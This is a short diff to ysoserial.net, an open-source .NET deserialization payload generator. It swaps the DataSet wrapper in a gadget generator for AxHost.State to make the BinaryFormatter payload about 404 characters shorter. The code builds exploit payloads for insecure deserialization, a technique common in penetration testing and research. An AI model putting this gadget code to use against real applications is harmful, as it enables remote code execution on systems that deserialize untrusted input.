@@ -106,6 +106,7 @@ namespace ysoserial.Generators
 
             // Wrap the object inside a DataSet. This is so we can use the custom
             // surrogate selector. Idiocy added and removed here.
+            /*
             info.SetType(typeof(System.Data.DataSet));
             info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
             info.AddValue("DataSet.DataSetName", "");
@@ -121,6 +122,20 @@ namespace ysoserial.Generators
             fmt.SurrogateSelector = new MySurrogateSelector();
             fmt.Serialize(stm, ls);
             info.AddValue("DataSet.Tables_0", stm.ToArray());
+            //*/
+
+            //* saving around  404 characters by using AxHost.State instead of DataSet
+            // However, DataSet can apply to more applications
+            // https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.axhost.state
+            // vs
+            // https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset
+            BinaryFormatter fmt = new BinaryFormatter();
+            MemoryStream stm = new MemoryStream();
+            fmt.SurrogateSelector = new MySurrogateSelector();
+            fmt.Serialize(stm, ls);
+            info.SetType(typeof(System.Windows.Forms.AxHost.State));
+            info.AddValue("PropertyBagBinary", stm.ToArray());
+            //*/
         }
     }
 
